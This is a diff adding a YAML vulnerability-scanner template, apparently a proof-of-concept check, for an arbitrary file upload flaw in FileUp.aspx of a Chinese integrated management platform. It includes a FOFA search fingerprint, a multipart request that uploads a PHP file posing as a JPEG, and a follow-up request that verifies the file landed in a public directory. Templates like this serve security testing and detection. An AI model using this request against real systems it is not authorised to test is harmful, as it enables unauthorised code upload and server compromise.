@@ -1,0 +1,35 @@
+id: poc-yaml-ydhz-intelligent-integrated-management-platform-FileUp-aspx-file-upload
+info:
+  name: 银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 银达汇智 智慧综合管理平台
+  fofa: title=智慧综合管理平台登入
+variables:
+  t1: random_int(1,1000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent
+  headers:
+    Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9
+  data: '--62907949903a4c499178971c9dab4ad9
+
+    Content-Disposition: form-data; name="Filedata"; filename="123.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php {{.t2}} ?>
+
+    --62907949903a4c499178971c9dab4ad9--
+
+    '
+  expression: status_code == 200 && contains(body, "php")
+  output:
+  - regex_match(body,"(?P<path>[0-9]+.php)")
+- method: GET
+  path: /imgnews/imgcontent/1/{{.path}}
+  expression: status_code == 200 && contains(body,t2) && contains(body,"php")
+transport: http
